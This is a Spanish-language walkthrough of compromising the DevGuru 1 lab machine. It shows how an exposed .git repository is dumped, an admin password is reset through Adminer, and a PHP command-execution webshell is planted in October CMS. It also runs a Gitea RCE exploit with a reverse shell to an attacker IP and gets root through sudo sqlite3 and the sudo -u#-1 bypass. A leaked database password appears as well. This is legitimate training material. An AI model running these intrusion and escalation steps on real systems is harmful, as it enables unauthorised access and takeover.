# DevGuru 1

Tags: [[_infoLeakage]],[[_cms]],[[_scripting]],[[_webExploitation]],[[_sudoersAbusing]]

## Primeros pasos
(Reconocimiento).

Primero le acomodamos bien para que agarre una IP (poner modo Bridged).

Organizamos TMUX.
Hacemos un escaneo en la red para determinar la IP de la máquina.
Mediante el OUI reconocemos la máquina que vamos a atacar.

Le hacemos un ping a la máquina. (Está activa o no).
Posible máquina Linux.
Creamos un directorio como la IP o nombre de la máquina.
Ponemos la IP de la máquina en un lugar visible.
Creamos los directorios de trabajo.

Empezamos el escaneo con NMAP.

Buscamos codename con launchpad, un posible Ubuntu Bionic.

Puertos abiertos.
22 - SSH. Versión 7.6 (menor a la 7.7)

80 - HTTP. Apache.

8585 - HTTP (Unknown)

## Investigación (Intrusión)
(Reconocimiento/Enumeración).

22.
Podríamos confirmar usuarios cuando dispongamos de unos.

80.
Habla acerca de GIT y de repositorios.
Whatweb no dice mucho, se menciona un usuario "support" y un dominio "devguru.local".

Contemplemos el dominio "devguru" y "devguru.local" en el /etc/hosts

En la web.
+IP
No está funcional la página, y el código fuente no dice mucho.

Wappalyzer reporta que tiene un October CMS, PHP.

+devguru
Parece ser la misma.

+devguru.local
Parece ser la misma.

Seguiremos en devguru.local por cualquier cosa.
Fuzzeemos (antes de, veamos el puerto 8585).
/about nos da posibles usuarios, creamos una lista de usuarios. No hay más. (los probamos por ssh pero ninguno es válido).

/backend nos redirige a un panel de autenticación de October. El usuario "frank" es válido pero no conocemos su password de momento.
En el código vemos que se maneja un token, on nombre "csrf", tengámoslo en cuenta. Cuando volvemos a entrar nos dice que el Document Expired, nos pide hacer un resend.
Por lo visto está sicronizado con la web de Gitea del 8585.

/artisan se habla de Artisan, y de unas configuraciones del mismo.


Antes de intentar Fuerza Bruta sobre el panel de autenticación de October, busquemos en searchsploit algo de October CMS (no parecen jugosas).

Recordando, había un /.git/ reportado por NMAP, pero desde la web se ve un 404.
<span style="color:#ff9a57">SIEMPRE tener en cuenta esto de cara a un .git</span>
Pues la idea sería jugar con gitdumper.
(Antes que nada intentamos clonar http://192.168.0.17/.git/ pero vemos que no va)
De gitdumper
Clono dumper de esta manera
svn checkout https://github.com/internetwache/GitTools/trunk/Dumper :    quito /tree/master y pongo /trunk
Y lo mismo para la carpeta Extractor.
<span style="color:#379075">Aunque a mi no me funcionó.</span>

Hacemos
./gitDumper.sh http://1922.168.0.17/.git/ ./project 
Para que en la carpeta project nos ponga el proyect de Git.

Para ahora jugar con el Extractor.
<span style="color:#88c425">./extractor.sh project ./fullProject </span>:    le pasamos el project que dumpeamos. Para que nos cree los directorios, archivos, etc., mejor estructurado.

Lo que encontramos del proyecto:
/adminer.php lo ponemos en la web, y es un panel de autenticación.

Hay un archivo database.php donde hay credenciales de acceso a la base de datos, entramos al panel de Adminer. (probamos "october" para ver si es válido a nivel de sistema, pero no)

Analicemos el Adminer.
Nos da una password de frank de la tabla "backend_users", pero está hasheada, al igual que un "persist_code".

Podemos cambiarle la contraseña, o intentar romper el hash (BCRYPT).
Pues ya habiendo visto el tipo de Hash, ir a bcrypt generator, colocar algo como password123 y hashearlo, para luego ir al Adminer y cambiarla.


En el panel de login de October, probamos la contraseña y pa deentro.

Analizar October.
En "CMS", y en "Home", se puede ver una parte donde meter código, me interpreta PHP la web, así que probemos con eso.
Busquemos en internet "october cms php code".
Entramos a una oficial y checamos.
Seguimos unos pasos para lograr poner código ahí, con el "Code" y el "Markup".

![[Pasted image 20240625230802.png]]

Y llamar a la funión ahí al final.
![[Pasted image 20240625230820.png]]

Pero en lugar de que sea "Hello World", que sea
![[Pasted image 20240625230946.png]]

Guardamos.
Como lo hicimos en la página principal, hacemos
http://192.168.0.17/?cmd=whoami
Y en un punto en la web se debería ver, y efectivamente, se ve el "www-data".

Ya sería cuestión de ganar acceso al sistema.


8585.
Whatweb reporta algo de gitea, y también se habla de GIT. 

En la web.
Corre un Gitea por detrás, version 1.12.5
Tenemos un usuario "frank".
Podemos registrarnos (deshabilitado) y entrar, para esto último nos pide usuario/email y contraseña.
(validemos con ssh si frank es usuario a nivel de sistema, sí lo es, root también).

Fuzzeemos (antes por el puerto 80).
Antes de fuzzear buquemos en searchsploit algo de Gitea (hay uno de RCE en la versión 1.12.5 que es la que tenemos, pero hay que estar autenticados).

Fuzzeando.
/debug hay una Toolbox Index pero los enlaces arrojan un 404.
/milestones me redirije al login, pero curioso que me aparezca.
/healtcheck me aparece algo de que la Database connection: OK.



## Escalada

Enumerar todo el sistema.
Probamos la contraseña de october:SQ66EBYx4GT3byXH con el usuario frank para ver si se reutiliza, pero no.

En /var/backups hay un archivo que tiene una password, podríamos usarla sobre otros usuarios, pero no es de frank.
O probar también en el Adminer, con el host, nombre de base de datos, etc., que viene está en el archivo. Y sí funcionan.
En una tabla user vemos a frank con un hash como password.
Podemos crackearla, o cambiarla como ya lo habíamos hecho. Solo que ponemos bcrypt para el tipo de algoritmo (lo escribimos manual).
Guardamos.

Tratamos de entrar al Gitea de frank, y pa deentro.
Recordando la vulnerabilidad del RCE para esta versión, podríamos intentarla.

<span style="color:#88c425">python3 49571.py -v -t http://192.168.0.17:8585 -u frank -p password123 -I 192.168.0.11 -P 443 -f prueba</span> 
<span style="color:#ecacb6">-f </span>para especificar un archivo con la reverse shell.
Y pa deeentro.

(También en el gitea, podríamos haber abusado de los Git Hooks, creando un script de bash que entable una reverse shell, crear un commit, y como se va a ejecutar el Git Hook, pues pa dentro).

<span style="color:#bef202">Escalar a root.</span>
<span style="color:#88c425">sudo -l</span> podemos ejecutar sqlite3 NO como root.
Puedo hacer
<span style="color:#88c425">sudo -u frank sqlite3 /dev/null '.shell /bin/sh'</span> :    y es lo mismo práctiamente.

Pero la versión del sudo es 1.8, así que si hago
<span style="color:#88c425">sudo -u#-1 sqlite3 /dev/null '.shell /bin/bash'</span> 
Burlamos la restricción y pa deeeeeentro.

FIN.
